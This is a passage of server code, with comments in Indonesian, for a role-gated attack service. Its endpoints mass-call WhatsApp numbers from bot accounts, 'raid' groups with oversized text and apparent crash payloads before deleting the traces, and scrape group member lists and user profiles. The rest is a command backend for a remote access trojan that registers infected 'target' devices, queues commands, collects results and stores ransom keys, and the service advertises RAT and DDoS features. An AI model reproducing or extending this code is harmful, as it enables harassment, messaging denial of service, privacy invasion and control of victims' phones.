    if (now - cooldown.lastReset > 300_000) {
        cooldown.count = 0;
        cooldown.lastReset = now;
    }

    if (cooldown.count >= 5) {
        const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
        return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
    }

    try {

        const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
        const otax = biz[socketId];

        await otax.updateBlockStatus(jid, "unblock");

        await otax.offerCall(jid, true);
        await otax.updateBlockStatus(jid, "block");
        console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

        cooldown.count++;
        spamCooldown[user.username] = cooldown;

        res.json({ valid: true, sended: true, total: callQty });

        for (let i = 1; i < callQty; i++) {
            setTimeout(async () => {
                try {
                    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
                    const otax = biz[socketId];

                    await otax.updateBlockStatus(jid, "unblock");

                    await otax.offerCall(jid, true);

                    await otax.updateBlockStatus(jid, "block");

                    console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
                } catch (err) {
                    console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
                }
            }, i * 10000);
        }
    } catch (err) {
        console.warn("[❌ FIRST CALL ERROR]", err.message);
        return res.json({ valid: false, message: "Call failed" });
    }
});

app.get("/raidGroup", async (req, res) => {
    const { key, link } = req.query;
    const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
    if (!match) return res.json({ valid: false, message: "Invalid group link" });

    const code = match[1];
    const username = await getUserByKey(key, req);
    if (!username) return res.json({ valid: false });

    const db = loadDatabase();
    const user = db.find(u => u.username && u.username.trim().toLowerCase() === username.trim().toLowerCase());
    if (blockReview(user, res)) return;
    if (!user || !["TK", "OWNER", "KINGZ"].includes(user.role)) {
        return res.json({ valid: false, message: "Access denied" });
    }

    const now = Date.now();
    if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
        const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
        return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
    }

    const bizKeys = Object.keys(biz);
    if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

    const fs = require("fs");
    const path = require("path");
    const dir = path.join(__dirname, "assets");
    const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
    if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

    try {
        const pickRandomSock = async (used = []) => {
            const unused = bizKeys.filter(k => !used.includes(k));
            if (!unused.length) throw new Error("No available bots to use");
            const randKey = unused[Math.floor(Math.random() * unused.length)];
            return { otax: biz[randKey], key: randKey };
        };

        const joinGroup = async () => {
            const usedKeys = [];
            const maxAttempts = bizKeys.length + 2;
            for (let attempt = 0; attempt < maxAttempts; attempt++) {
                const { otax, key } = await pickRandomSock(usedKeys);
                usedKeys.push(key);
                try {
                    const groupJid = await otax.groupAcceptInvite(code);
                    return { sock: otax, groupJid };
                } catch (err) {
                    console.log(`[!] ${key} gagal join: ${err.message}`);
                    continue;
                }
            }
            throw new Error("No available bots to join");
        };

        const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
        res.json({ valid: true, sended: true });

        cooldowns[user.username] = Date.now();

        const raidBot = async (otax, groupJid) => {
            for (let round = 0; round < 2; round++) {
                const sentMsg = await otax.sendMessage(groupJid, {
                    text: `[otax Project]\n` + 'ꦾ'.repeat(30000)
                });
                await new Promise(r => setTimeout(r, 1000));

                const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
                for (const sticker of randomStickers) {
                    const buffer = fs.readFileSync(path.join(dir, sticker));
                    await otax.sendMessage(groupJid, { sticker: buffer });
                    await gcCrash(otax, groupJid);
                    await FreezePackk(otax, groupJid);
                    await new Promise(r => setTimeout(r, 300));
                }

                await new Promise(r => setTimeout(r, 600));
            }

            await otax.groupLeave(groupJid);
            await new Promise(r => setTimeout(r, 500));

            const lastMessagesInChat = {
                key: { remoteJid: groupJid, fromMe: true, id: "" },
                messageTimestamp: Math.floor(Date.now() / 1000)
            };
            await otax.chatModify({
                delete: true,
                lastMessages: [lastMessagesInChat]
            }, groupJid);

            console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
        };

        await Promise.all([
            raidBot(s1.otax, s1.groupJid),
            raidBot(s2.otax, s2.groupJid)
        ]);

        return;
    } catch (err) {
        console.warn("[❌ RAID ERROR]", err.message);
        return res.json({ valid: false, message: "Join or send failed" });
    }
});

app.get("/spyGroup", async (req, res) => {
    const { key, link } = req.query;
    const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
    if (!match) return res.json({ valid: false, message: "Invalid link" });

    const code = match[1];
    const username = await getUserByKey(key, req);
    if (!username) return res.json({ valid: false });

    const db = loadDatabase();
    const user = db.find(u => u.username && u.username.trim().toLowerCase() === username.trim().toLowerCase());
    if (blockReview(user, res)) return;
    if (!user) return res.json({ valid: false });

    const bizKeys = Object.keys(biz);
    if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

    const otax = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

    try {
        const groupJid = await otax.groupAcceptInvite(code);
        const metadata = await otax.groupMetadata(groupJid);

        const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
        const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

        await otax.groupLeave(groupJid);

        return res.json({
            valid: true,
            groupId: groupJid,
            groupName: metadata.subject,
            desc: metadata.desc || "No description",
            admin: admins,
            participant: members,
        });
    } catch (err) {
        console.warn("[❌ SPY GROUP ERROR]", err.message);
        return res.json({ valid: false, message: "Spy failed" });
    }
});

app.get("/getInfo", async (req, res) => {
    const { key, number } = req.query;
    const username = await getUserByKey(key, req);
    if (!username) return res.json({ valid: false });

    const bizKeys = Object.keys(biz);
    if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

    const otax = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
    const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

    try {
        const ppUrl = await otax.profilePictureUrl(jid, 'image').catch(() => null);
        const statusObj = await otax.fetchStatus(jid).catch(() => null);
        const check = await otax.onWhatsApp(number).catch(() => []);
        const info = check[0] || {};

        return res.json({
            valid: true,
            number: number,
            photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
            bio: statusObj?.status || "No bio",
            online: !!statusObj?.lastSeen,
            type: info.biz ? "business" : "personal"
        });
    } catch (err) {
        console.warn("[❌ GETINFO ERROR]", err.message);
        return res.json({ valid: false, message: "Query failed" });
    }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

let _keyListCache = null;
let _keyListCacheTime = 0;
const KEY_LIST_CACHE_TTL = 5000;

function loadKeyList() {
    const now = Date.now();
    if (!_keyListCache || (now - _keyListCacheTime) > KEY_LIST_CACHE_TTL) {
        try { _keyListCache = JSON.parse(fs.readFileSync(KEY_LIST_FILE, "utf8")); } catch { _keyListCache = []; }
        _keyListCacheTime = now;
    }
    return _keyListCache;
}
function saveKeyList(list) {
    try { fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2)); } catch { }
    syncSikmanuk();
}
function recordKey({ username, key, role, ip, androidId }) {
    const list = loadKeyList();
    const stamp = new Date().toISOString();
    const idx = list.findIndex(e => e.username === username);
    if (idx !== -1) { list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId }; }
    else { list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId }); }
    saveKeyList(list);
}

const news = [
    {
        image: "https://files.catbox.moe/xy4yji.png",
        title: "PASAR ONLINE",
        desc: "Fitur New Bisa Menitipkan Jasa Posting Barang!"
    },
    {
        image: "https://files.catbox.moe/vtnfdn.png",
        title: "RAT ( BETA ) DAN DDOS",
        desc: "Penambahan Fitur RAT dan DDOS Game"
    }
];


app.post("/validate", (req, res) => {
    const { username, password, version, androidId } = req.body || {};

    const cleanUser = typeof username === 'string' ? username.trim() : '';
    const cleanPass = typeof password === 'string' ? password : '';
    const cleanAndroidId = typeof androidId === 'string' ? androidId.trim() : '';

    if (!cleanAndroidId || cleanAndroidId === "unknown_device") {
        return res.status(400).json({ valid: false, reason: "android", message: "androidId required" });
    }

    if (!cleanUser || !cleanPass) {
        return res.status(400).json({ valid: false, message: "Username dan password diperlukan" });
    }

    const db = loadDatabaseFresh();
    const user = db.find(u =>
        typeof u?.username === 'string' &&
        u.username.trim().toLowerCase() === cleanUser.toLowerCase() &&
        u.password === cleanPass
    );

    if (!user) return res.status(401).json({ valid: false, reason: "credentials", message: "Username atau password salah" });
    if (isExpired(user)) return res.json({ valid: true, expired: true });

    const keyList = loadKeyList();
    const existingSession = keyList.find(e =>
        typeof e?.username === 'string' && e.username.trim().toLowerCase() === user.username.trim().toLowerCase()
    );

    if (existingSession && existingSession.androidId && existingSession.androidId !== cleanAndroidId) {
        return res.status(403).json({ valid: false, reason: 'device', message: 'Akun terdaftar di perangkat lain' });
    }

    if (existingSession && existingSession.sessionKey) {
        delete activeKeys[existingSession.sessionKey];
    }

    const key = generateKey();
    const nowMs = Date.now();
    activeKeys[key] = { username: user.username, created: nowMs, expires: nowMs + 30 * 24 * 60 * 60 * 1000 };

    recordKey({
        username: user.username,
        key,
        role: user.role || "MEMBER",
        ip: req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.ip || "unknown",
        androidId: cleanAndroidId
    });
    saveActiveKeys();
    if (typeof syncSikmanuk === 'function') syncSikmanuk();

    const newWorker = assignWorker(user);
    if (user.worker !== newWorker) {
        user.worker = newWorker;
        saveDatabase(db);
    }

    const { targetWorker, roleKey } = getWorkerEndpointForUser(user);

    res.json({
        valid: true,
        expired: false,
        key,
        expiredDate: formatDateExp(user.expiredDate),
        role: roleKey === "member" ? "member" : roleKey,
        worker: user.worker,
        targetWorker: targetWorker ? workerNameOf(targetWorker) : null,
        targetIp: targetWorker ? targetWorker.vpsIP : null,
        targetApiPort: targetWorker ? targetWorker.apiPort : null,
        targetWsPort: targetWorker ? targetWorker.wsPort : null,
        listBug: typeof bugs !== 'undefined' ? bugs : [],
        listDDoS: [],
        news: typeof news !== 'undefined' ? news : []
    });
});

app.get("/validate", (req, res) => {
    res.status(405).json({
        valid: false,
        error: "Method Not Allowed",
        message: "Gunakan POST /validate dengan JSON body username, password, androidId, dan version"
    });
});




const TQTO_FILE = path.join(__dirname, "tqto.json");

function loadContributors() {
    if (!fs.existsSync(TQTO_FILE)) {
        fs.writeFileSync(TQTO_FILE, JSON.stringify({ contributors: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(TQTO_FILE, "utf8"));
}

function saveContributors(data) {
    fs.writeFileSync(TQTO_FILE, JSON.stringify(data, null, 2));
}

app.get("/api/contributors", (req, res) => {
    try {
        const data = loadContributors();
        res.status(200).json({
            contributors: data.contributors || []
        });
    } catch (err) {
        res.status(500).json({
            message: "Failed to load contributors"
        });
    }
});
app.get("/myInfo", async (req, res) => {
    const { username, password, androidId, key } = req.query;


    const db = loadDatabaseFresh();
    const user = db.find(u => u.username === username && u.password === password);
    const keyList = loadKeyList();
    if (!user) {
        return res.json({ valid: false });
    }

    const userKey = keyList.find(function (k) { return k.username === username; });
    const verifiedUsername = await getUserByKey(key, req);
    if (!verifiedUsername && !userKey) {
        return res.json({ valid: false, reason: "session" });
    }

    if (userKey && userKey.androidId && userKey.androidId !== androidId) {
        return res.json({ valid: false, reason: "device" });
    }

    if (isExpired(user)) {
        return res.json({ valid: true, expired: true });
    }

    recordKey({
        username,
        key,
        role: user.role || 'member',
        ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
        androidId
    });



    const { targetWorker, roleKey } = getWorkerEndpointForUser(user);

    return res.json({
        valid: true,
        expired: false,
        key,
        username: user.username,
        password: "******",
        expiredDate: formatDateExp(user.expiredDate),
        role: roleKey === "member" ? "member" : roleKey,
        worker: user.worker,
        targetWorker: targetWorker ? workerNameOf(targetWorker) : null,
        targetIp: targetWorker ? targetWorker.vpsIP : null,
        targetApiPort: targetWorker ? targetWorker.apiPort : null,
        targetWsPort: targetWorker ? targetWorker.wsPort : null,
        listBug: bugs,
        news: news // ✅ Tambahkan ini
    });
});
const CHATROOM_FILE = path.join(__dirname, "chatroom.json");
const CHATROOM_UPLOAD_DIR = path.join(__dirname, "uploads");


let lastChatroomCleanupDate = new Date().toDateString();
setInterval(() => {
    try {
        const currentDate = new Date().toDateString();
        if (currentDate !== lastChatroomCleanupDate) {
            if (fs.existsSync(CHATROOM_FILE)) {
                fs.unlinkSync(CHATROOM_FILE);
                console.log(`[CLEANUP] ${new Date().toISOString()} - Chatroom.json dihapus (Pembersihan harian)`);
            }
            lastChatroomCleanupDate = currentDate;
        }
    } catch (err) {
        console.error('[CLEANUP] Error harian chatroom:', err);
    }
}, 10 * 60 * 1000); // Cek tiap 10 menit

if (!fs.existsSync(CHATROOM_UPLOAD_DIR)) fs.mkdirSync(CHATROOM_UPLOAD_DIR, { recursive: true });
const chatroomUpload = multer({ dest: CHATROOM_UPLOAD_DIR });

function loadChatroom() {
    try {
        const file = fs.readFileSync(CHATROOM_FILE, "utf8");
        const parsed = JSON.parse(file);
        return Array.isArray(parsed) ? parsed : [];
    } catch {
        return [];
    }
}

function saveChatroom(data) {
    fs.writeFileSync(CHATROOM_FILE, JSON.stringify(data, null, 2));
}

function normalizeChatMessage(item) {
    if (!item || typeof item !== "object") return null;

    const type = ["text", "image", "audio"].includes(item.type) ? item.type : "text";
    const time = Number(item.time) || Date.now();
    const from = sanitize(item.from || "Unknown");
    const message = typeof item.message === "string" ? item.message.slice(0, 2000) : "";
    const mediaUrl = typeof item.mediaUrl === "string" ? item.mediaUrl : "";
    const mimeType = typeof item.mimeType === "string" ? item.mimeType : "";
    const fileName = typeof item.fileName === "string" ? item.fileName : "";
    const duration = Number(item.duration) || 0;
    const size = Number(item.size) || 0;
    let replyTo = null;

    if (item.replyTo && typeof item.replyTo === "object") {
        replyTo = {
            id: typeof item.replyTo.id === "string" ? item.replyTo.id : "",
            from: sanitize(item.replyTo.from || "Unknown"),
            type: ["text", "image", "audio"].includes(item.replyTo.type) ? item.replyTo.type : "text",
            message: typeof item.replyTo.message === "string" ? item.replyTo.message.slice(0, 240) : "",
            mediaUrl: typeof item.replyTo.mediaUrl === "string" ? item.replyTo.mediaUrl : "",
            fileName: typeof item.replyTo.fileName === "string" ? item.replyTo.fileName : ""
        };
    }

    return {
        id: item.id || `${time}_${Math.random().toString(36).slice(2, 10)}`,
        from,
        type,
        message,
        mediaUrl,
        mimeType,
        fileName,
        duration,
        size,
        replyTo,
        status: typeof item.status === "string" ? item.status : "terkirim",
        time
    };
}

function appendChatroomMessage(payload) {
    const chats = loadChatroom().map(normalizeChatMessage).filter(Boolean);
    const message = normalizeChatMessage(payload);
    chats.push(message);
    const trimmed = chats.slice(-1000);
    saveChatroom(trimmed);
    return message;
}

function buildAbsoluteUploadUrl(req, relativePath) {
    const host = req.get("host");
    const proto = req.headers["x-forwarded-proto"] || req.protocol || "http";
    return `${proto}://${host}${relativePath}`;
}

function parseReplyPayload(rawReply) {
    if (!rawReply) return null;
    if (typeof rawReply === "string") {
        try {
            return JSON.parse(rawReply);
        } catch {
            return null;
        }
    }
    if (typeof rawReply === "object") {
        return rawReply;
    }
    return null;
}

app.get("/chatroom", (req, res) => {
    const since = Number(req.query.since) || 0;
    const chats = loadChatroom()
        .map(normalizeChatMessage)
        .filter(Boolean)
        .filter(item => item.time > since);
    res.json(chats);
});

app.post("/chatroom", (req, res) => {
    const from = sanitize(req.body.from || "");
    const message = typeof req.body.message === "string" ? req.body.message.trim() : "";

    if (!from || !message) {
        return res.status(400).json({ success: false, message: "from and message are required" });
    }

    const newData = appendChatroomMessage({
        from,
        type: "text",
        message,
        replyTo: parseReplyPayload(req.body.replyTo)
    });

    res.json({ success: true, data: newData });
});

app.post("/chatroom/media", chatroomUpload.single("file"), (req, res) => {
    const from = sanitize(req.body.from || "");
    const message = typeof req.body.message === "string" ? req.body.message.trim().slice(0, 500) : "";

    if (!from) {
        return res.status(400).json({ success: false, message: "from is required" });
    }

    if (!req.file) {
        return res.status(400).json({ success: false, message: "file is required" });
    }

    const mimeType = req.file.mimetype || "";
    const originalName = (req.file.originalname || "").toLowerCase();
    const ext = path.extname(originalName);
    const imageExts = new Set([".jpg", ".jpeg", ".png", ".webp", ".gif", ".bmp"]);
    const audioExts = new Set([".m4a", ".aac", ".mp3", ".wav", ".ogg", ".opus", ".3gp"]);
    const isImage = mimeType.startsWith("image/") || imageExts.has(ext);
    const isAudio = mimeType.startsWith("audio/") || audioExts.has(ext);

    if (!isImage && !isAudio) {
        try { fs.unlinkSync(req.file.path); } catch { }
        return res.status(400).json({ success: false, message: "unsupported media type" });
    }

    const finalExt = ext || (isImage ? ".jpg" : ".m4a");
    const safeName = `${Date.now()}_${Math.random().toString(36).slice(2, 10)}${finalExt}`;
    const finalPath = path.join(CHATROOM_UPLOAD_DIR, safeName);

    try {
        fs.renameSync(req.file.path, finalPath);
    } catch {
        try { fs.copyFileSync(req.file.path, finalPath); } catch { }
        try { fs.unlinkSync(req.file.path); } catch { }
    }

    const relativeUrl = `/uploads/${safeName}`;
    const newData = appendChatroomMessage({
        from,
        type: isImage ? "image" : "audio",
        message,
        mediaUrl: buildAbsoluteUploadUrl(req, relativeUrl),
        mimeType,
        fileName: req.file.originalname || safeName,
        size: Number(req.file.size) || 0,
        duration: Number(req.body.duration) || 0,
        replyTo: parseReplyPayload(req.body.replyTo)
    });

    res.json({ success: true, data: newData });
});
app.post("/changepass", (req, res) => {
    const { username, oldPass, newPass } = req.body;

    if (!username || !oldPass || !newPass) {
        return res.json({
            success: false,
            message: "Incomplete data"
        });
    }

    const db = loadDatabase();
    const idx = db.findIndex(
        u => u.username === username && u.password === oldPass
    );

    if (idx === -1) {
        return res.json({
            success: false,
            message: "Invalid credentials"
        });
    }


    if (db[idx].role === "REVIEW") {
        return res.status(403).json({
            success: false,
            message: "Account REVIEW tidak diizinkan mengubah password"
        });
    }


    db[idx].password = newPass;
    saveDatabase(db);

    return res.json({
        success: true,
        message: "Password updated successfully"
    });
});


app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

const DATA_DIRAT = path.join(__dirname, 'rat');
const TARGETS_FILE = path.join(DATA_DIRAT, 'targets.json');
const COMMANDS_FILE = path.join(DATA_DIRAT, 'commands.json');

const inMemoryCommands = {};
try {
    if (fs.existsSync(COMMANDS_FILE)) {
        Object.assign(inMemoryCommands, JSON.parse(fs.readFileSync(COMMANDS_FILE, 'utf8')));
    }
} catch (e) {
    console.error('Gagal meload commands.json ke memori:', e.message);
}
const RESULTS_FILE = path.join(DATA_DIRAT, 'results.json');

const inMemoryResults = {};
try {
    if (fs.existsSync(RESULTS_FILE)) {
        Object.assign(inMemoryResults, JSON.parse(fs.readFileSync(RESULTS_FILE, 'utf8')));
    }
} catch (e) {
    console.error('Gagal meload results.json ke memori:', e.message);
}
const RANSOM_KEY_FILE = path.join(DATA_DIRAT, 'ransom_keys.json');
const NOTIF_REPORT_FILE = path.join(DATA_DIRAT, 'notif_report.json');
const UPLOAD_DIR = path.join(__dirname, 'uploads');

if (!fs.existsSync(DATA_DIRAT)) fs.mkdirSync(DATA_DIRAT, { recursive: true });
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, UPLOAD_DIR)
    },
    filename: function (req, file, cb) {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9)
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname))
    }
});
const upload = multer({
    storage,
    limits: { fileSize: 10 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        const allowed = new Set(['image/jpeg', 'image/png', 'image/webp', 'image/gif', 'application/zip', 'application/octet-stream']);
        cb(null, allowed.has(file.mimetype));
    },
});
app.use('/uploads', express.static(UPLOAD_DIR));


app.post('/api/upload', requireSession, upload.single('image'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'Tidak ada file yang diunggah' });

    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host');
    const fileUrl = `${protocol}://${host}/uploads/${req.file.filename}`;

    res.json({
        success: true,
        url: fileUrl,
        filename: req.file.filename,
        mimetype: req.file.mimetype,
        size: req.file.size
    });
});

function initFile(file, defaultData) {
    if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
}
initFile(TARGETS_FILE, []);
initFile(COMMANDS_FILE, {});
initFile(RESULTS_FILE, {});
initFile(RANSOM_KEY_FILE, {});
initFile(NOTIF_REPORT_FILE, []);

// [OPTIMASI] Cache JSON files di memori
const _jsonCache = {};
const _jsonCacheTime = {};
const JSON_CACHE_TTL = 5000; // 5 detik

function readJSON(file) {
    const now = Date.now();
    if (!_jsonCache[file] || (now - (_jsonCacheTime[file] || 0)) > JSON_CACHE_TTL) {
        try {
            _jsonCache[file] = JSON.parse(fs.readFileSync(file, 'utf8'));
        } catch {
            _jsonCache[file] = null;
        }
        _jsonCacheTime[file] = now;
    }
    return _jsonCache[file];
}

function writeJSON(file, data) {
    try {
        const tmpPath = file + '.tmp_' + Date.now();
        fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2));
        fs.renameSync(tmpPath, file);
        _jsonCache[file] = data;
        _jsonCacheTime[file] = Date.now();
    } catch (e) {
        console.error('[writeJSON]', file, e.message);
        try { fs.writeFileSync(file, JSON.stringify(data, null, 2)); } catch { }
        _jsonCache[file] = data;
        _jsonCacheTime[file] = Date.now();
    }
}

const OFFLINE_THRESHOLD_MS = 12 * 60 * 60 * 1000;
function purgeOfflineTargets() {
    return; // Dihapus sesuai permintaan agar device offline lama tidak hilang
}
setInterval(purgeOfflineTargets, 10 * 60 * 1000);
purgeOfflineTargets();

const SPAM_DEVICES = ['hacktivist', 'android0x1337', 'nst_id'];
function isSpamDevice(m, mo) {
    const s = ((m || '') + (mo || '')).toLowerCase();
    return SPAM_DEVICES.some(n => s.includes(n));
}

function normalizeOwnerValue(value) {
    return String(value || '').trim();
}

function buildConfigPayload(req) {
    const protocol = ((req.headers['x-forwarded-proto'] || req.protocol || 'http') + '').split(',')[0].trim();
    const host = (req.headers['x-forwarded-host'] || req.get('host') || '').toString().trim();
    const fallbackBaseUrl = host ? `${protocol}://${host}` : '';
    return {
        username: process.env.MANTA_CONFIG_USERNAME || '',
        session_id: process.env.MANTA_CONFIG_SESSION_ID || '',
        base_url: process.env.MANTA_BASE_URL || fallbackBaseUrl,
        webview_url: process.env.MANTA_WEBVIEW_URL || 'https://www.google.com',
        app_name: process.env.KAZE_APP_NAME || process.env.MANTA_APP_NAME || 'KAZE X',
        logo_url: process.env.MANTA_LOGO_URL || 'https://files.catbox.moe/fi1fpt.jpg',
    };
}

function targetMatchesOwner(target, { sessionKey = '', username = '' } = {}) {
    const keyNorm = normalizeOwnerValue(sessionKey);
    const userNorm = normalizeOwnerValue(username);

    if (!keyNorm && !userNorm) return false;

    const owners = new Set([
        normalizeOwnerValue(target?.username),
        normalizeOwnerValue(target?.session_id),
        normalizeOwnerValue(target?.owner_username),
        normalizeOwnerValue(target?.owner_key),
    ].filter(val => val !== ''));

    return (keyNorm !== '' && owners.has(keyNorm)) || (userNorm !== '' && owners.has(userNorm));
}

function resolveRegisterIdentity(body = {}) {
    const db = loadDatabase();
    const keyList = loadKeyList();
    const rawUsername = normalizeOwnerValue(body.username);
    const rawSessionId = normalizeOwnerValue(body.session_id);

    let resolvedUsername = '';
    let resolvedSessionId = rawSessionId;
    let matched = false;
    let matchSource = 'raw';

    if (rawUsername) {
        const dbUser = db.find(u => normalizeOwnerValue(u.username).toLowerCase() === rawUsername.toLowerCase());
        if (dbUser) {
            resolvedUsername = dbUser.username;
            matched = true;
            matchSource = 'database_username';
        }
    }

    if (!resolvedUsername && rawSessionId) {
        const keyEntry = keyList.find(e => normalizeOwnerValue(e.sessionKey) === rawSessionId);
        if (keyEntry && keyEntry.username) {
            const dbUser = db.find(u => normalizeOwnerValue(u.username).toLowerCase() === normalizeOwnerValue(keyEntry.username).toLowerCase());
            resolvedUsername = dbUser ? dbUser.username : normalizeOwnerValue(keyEntry.username);
            matched = true;
            matchSource = 'keylist_session';
        }
    }

    if (!resolvedUsername && rawSessionId && activeKeys[rawSessionId]?.username) {
        const activeUsername = normalizeOwnerValue(activeKeys[rawSessionId].username);
        const dbUser = db.find(u => normalizeOwnerValue(u.username).toLowerCase() === activeUsername.toLowerCase());
        resolvedUsername = dbUser ? dbUser.username : activeUsername;
        matched = true;
        matchSource = 'active_session';
    }

    if (!resolvedSessionId && resolvedUsername) {
        const keyEntry = keyList.find(e => normalizeOwnerValue(e.username).toLowerCase() === resolvedUsername.toLowerCase());
        if (keyEntry?.sessionKey) {
            resolvedSessionId = normalizeOwnerValue(keyEntry.sessionKey);
        }
    }

    return {
        username: resolvedUsername || rawUsername,
        session_id: resolvedSessionId || rawSessionId,
        matched,
        match_source: matchSource,
    };
}

app.get('/config.json', (req, res) => {
    res.json(buildConfigPayload(req));
});

function updateTarget(body) {
    const { device_id, manufacturer, model, sdk, android, country, operator, username, session_id, lock_pin_set, lock_mode, ip } = body;
    if (isSpamDevice(manufacturer, model)) return;
    const targets = readJSON(TARGETS_FILE) || [];
    const idx = targets.findIndex(t => t.device_id === device_id);
    const cleanUsername = normalizeOwnerValue(username || session_id);
    const cleanSessionId = normalizeOwnerValue(session_id || username);
    const entry = {
        device_id,
        manufacturer: manufacturer || '',
        model: model || '',
        sdk: sdk || '',
        android: android || '',
        country: country || '',
        operator: operator || '',
        username: cleanUsername,
        session_id: cleanSessionId,
        owner_username: cleanUsername,
        owner_key: cleanSessionId,
        lock_pin_set: Boolean(lock_pin_set),
        lock_mode: normalizeOwnerValue(lock_mode) || 'default',
        ip: ip || (idx !== -1 ? targets[idx].ip : ''),
        last_seen: new Date().toISOString(),
    };
    if (idx !== -1) targets[idx] = { ...targets[idx], ...entry };
    else targets.push(entry);
    writeJSON(TARGETS_FILE, targets);
}

const lastSeenCache = {};
setInterval(() => {
    if (Object.keys(lastSeenCache).length === 0) return;
    const targets = readJSON(TARGETS_FILE) || [];
    let updated = false;
    for (const device_id in lastSeenCache) {
        const idx = targets.findIndex(t => t.device_id === device_id);
        if (idx !== -1) {
            targets[idx].last_seen = lastSeenCache[device_id];
            updated = true;
        }
        delete lastSeenCache[device_id];
    }
    if (updated) {
        writeJSON(TARGETS_FILE, targets);
    }
}, 10000);

function updateLastSeen(device_id) {
    lastSeenCache[device_id] = new Date().toISOString();
}

// [OPTIMASI MANTA] Auto-cleanup target yang sudah uninstall / mati total > 1 hari
setInterval(() => {
    const targets = readJSON(TARGETS_FILE) || [];
    if (targets.length === 0) return;
    const now = new Date();
    const MAX_OFFLINE_MS = 1 * 24 * 60 * 60 * 1000; // 1 Hari

    let updated = false;
    const activeTargets = targets.filter(t => {
        if (!t.last_seen) return true;
        const lastDate = new Date(t.last_seen);
        const isDead = (now - lastDate) > MAX_OFFLINE_MS;
        if (isDead) {
            updated = true;
            return false; // Hapus dari array
        }
        return true;
    });

    if (updated) {
        writeJSON(TARGETS_FILE, activeTargets);
        console.log(`[CLEANUP] Dihapus ${targets.length - activeTargets.length} target yang mati permanen (>1 hari).`);
    }
}, 60 * 60 * 1000); // Cek setiap 1 jam sekali


function purgeSpamNow() {
    const targets = readJSON(TARGETS_FILE) || [];
    const clean = targets.filter(t => !isSpamDevice(t.manufacturer, t.model));
    if (clean.length < targets.length) writeJSON(TARGETS_FILE, clean);
}
setInterval(purgeSpamNow, 60 * 1000);
purgeSpamNow();

app.post('/register', (req, res) => {
    if (!req.body) return res.status(400).json({ error: 'Bad Request' });
    const { device_id } = req.body;
    if (!device_id) return res.status(400).json({ error: 'device_id required' });
    updateLastSeen(device_id);
    const resolvedIdentity = resolveRegisterIdentity(req.body);
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    const payload = {
        ...req.body,
        username: resolvedIdentity.username || req.body.username || '',
        session_id: resolvedIdentity.session_id || req.body.session_id || '',
        ip: clientIp,
    };
    updateTarget(payload);
    console.log(`[+] Register: ${device_id} | IP: ${clientIp} | owner=${payload.username || '-'} | session=${payload.session_id || '-'} | source=${resolvedIdentity.match_source}`);
    res.json({
        status: 'registered',
        username: payload.username,
        session_id: payload.session_id,
        matched: resolvedIdentity.matched,
        match_source: resolvedIdentity.match_source,
    });
});
const CHAT_DATA_FILE = path.join(__dirname, 'chats.json');

if (!fs.existsSync(CHAT_DATA_FILE)) {
    fs.writeFileSync(CHAT_DATA_FILE, JSON.stringify({}));
}

function loadChats() {
    try {
        return JSON.parse(fs.readFileSync(CHAT_DATA_FILE, 'utf8'));
    } catch {
        return {};
    }
}

function saveChats(data) {
    fs.writeFileSync(CHAT_DATA_FILE, JSON.stringify(data, null, 2));
}

function addMessage(deviceId, sender, text) {
    const chats = loadChats();
    if (!chats[deviceId]) chats[deviceId] = [];

    let ts = Date.now();
    const lastMsg = chats[deviceId].length > 0 ? chats[deviceId][chats[deviceId].length - 1] : null;
    if (lastMsg && ts <= lastMsg.timestamp) {
        ts = lastMsg.timestamp + 1;
    }

    const message = {
        sender: sender,
        text: text,
        timestamp: ts
    };
    chats[deviceId].push(message);
    if (chats[deviceId].length > 500) chats[deviceId] = chats[deviceId].slice(-500);
    saveChats(chats);
    return message;
}

const pollingWaiters = {};

app.post('/chat/send', async (req, res) => {
